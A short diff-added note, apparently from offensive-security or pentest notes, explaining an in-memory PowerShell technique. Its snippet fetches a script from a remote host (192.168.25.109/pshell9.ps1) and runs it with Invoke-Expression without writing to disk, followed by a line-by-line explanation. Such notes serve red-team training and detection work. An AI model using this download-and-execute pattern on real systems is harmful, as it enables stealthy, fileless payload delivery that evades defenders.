@@ -1,0 +1,20 @@
+In-Memory Script Execution
+
+Script:
+# URL of the script to download
+$scriptUrl = "http://192.168.25.109/pshell9.ps1"
+# Download the script content
+$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0
+$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)
+# Execute the script in memory
+Invoke-Expression -Command $scriptContent
+            
+Explanation of Commands:
+$scriptUrl = "http://192.168.25.109/pshell9.ps1"
+This line defines the URL where the remote PowerShell script is hosted. In this example, the script is hosted locally on IP 192.168.25.109.
+Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0
+This command downloads the script content from the specified URL using the HTTP GET method. -UseBasicParsing ensures that minimal parsing is used, which makes the command work in non-Internet Explorer environments. -MaximumRedirection 0 prevents redirections.
+$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)
+The script content is converted from bytes to a UTF-8 encoded string so it can be executed by PowerShell.
+Invoke-Expression -Command $scriptContent
+This command executes the downloaded script content directly in memory, without saving it to disk.
